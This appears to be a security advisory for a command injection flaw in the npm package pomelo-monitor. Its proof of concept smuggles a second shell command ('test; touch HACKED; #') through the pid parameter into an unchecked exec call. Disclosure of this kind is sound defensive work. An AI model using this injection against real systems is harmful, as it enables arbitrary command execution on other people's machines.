
The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/halfblood369/monitor/blob/master/lib/processMonitor.js#L26).
## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var monitor = require('pomelo-monitor');
var param = {pid: 'test; touch HACKED; #', serverId: 'node-1'};
monitor.psmonitor.getPsInfo(param, function(err, data) {});
```
2. Check that there aren't any files called `HACKED`. 
3. Execute the following commands in another terminal:
```bash
npm i pomelo-monitor # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files - now `HACKED` has been created.
## References
- [GitHub Issue](https://github.com/halfblood369/monitor/issues/1)